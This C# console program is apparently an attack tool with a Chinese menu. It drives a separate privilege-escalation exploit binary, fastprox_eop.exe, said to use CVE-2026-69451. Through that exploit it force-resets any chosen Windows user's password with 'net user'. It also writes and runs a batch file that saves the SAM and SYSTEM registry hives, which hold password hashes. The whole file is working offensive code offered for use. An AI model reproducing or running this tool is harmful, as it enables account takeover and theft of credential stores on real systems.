using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;

Console.InputEncoding = System.Text.Encoding.UTF8;
Console.OutputEncoding = System.Text.Encoding.UTF8;

FluentConsole.Cyan.Line("--- 密码工具 By CreeperMPG ---")
    .Gray.Line("[*] 使用 CVE-2026-69451，确保 fastprox_eop.exe 与该工具在同一目录下");

while (true)
{
    FluentConsole.Gray.Line("\n-----------------------------------------")
        .Cyan.Line("操作列表")
        .Green.Line(" [0] 退出应用程序")
        .Green.Line(" [1] 强制设置指定用户密码")
        .Green.Line(" [2] 导出 SAM 与 SYSTEM 的注册表信息")
        .Magenta.Text("请选择：");
    int choice = 0;
    while (true)
    {
        var key = Console.ReadKey();
        switch (key.KeyChar)
        {
            case '0':
                return;
            case '1':
                choice = 1;
                break;
            case '2':
                choice = 2;
                break;
        }
        if (choice != 0)
        {
            break;
        }
    }
    FluentConsole.Line("");
    if (choice == 1)
    {
        FluentConsole.Magenta.Text("请输入用户名：");
        string username = Console.ReadLine();
        FluentConsole.Magenta.Text("请输入新密码 [留空即清除]：");
        string newPassword = Console.ReadLine();
        try
        {
            ProcessStartInfo psi = new("fastprox_eop.exe", $"--cmd \"net user \"{username}\" \"{newPassword}\"\" --out \"result-{Guid.NewGuid()}.txt\"");
            Process.Start(psi).WaitForExit();
            FluentConsole.Green.Line($"[+] 执行成功");
        }
        catch (Exception ex)
        {
            FluentConsole.Red.Line($"[-] 执行失败: {ex.Message}");
        }
    }
    else if (choice == 2)
    {
        try
        {
            string directory = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"SAM_EXPORT"); 
            Directory.CreateDirectory(directory);
            File.WriteAllText(Path.Combine(directory, "export.bat"), $"reg save HKLM\\SAM \"{Path.Combine(directory, "SAM")}\n" +
                                                                     $"reg save HKLM\\SYSTEM \"{Path.Combine(directory, "SYSTEM")}\"");
            ProcessStartInfo psi = new("fastprox_eop.exe", $"--cmd \"{Path.Combine(directory, "export.bat")}\" --out \"{Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"result-{Guid.NewGuid()}.txt")}\"");
            Process.Start(psi).WaitForExit();
            FluentConsole.Green.Line($"[+] 执行成功，输出到 {directory}");
        }
        catch (Exception ex)
        {
            FluentConsole.Red.Line($"[-] 执行失败: {ex.Message}");
        }
    }
}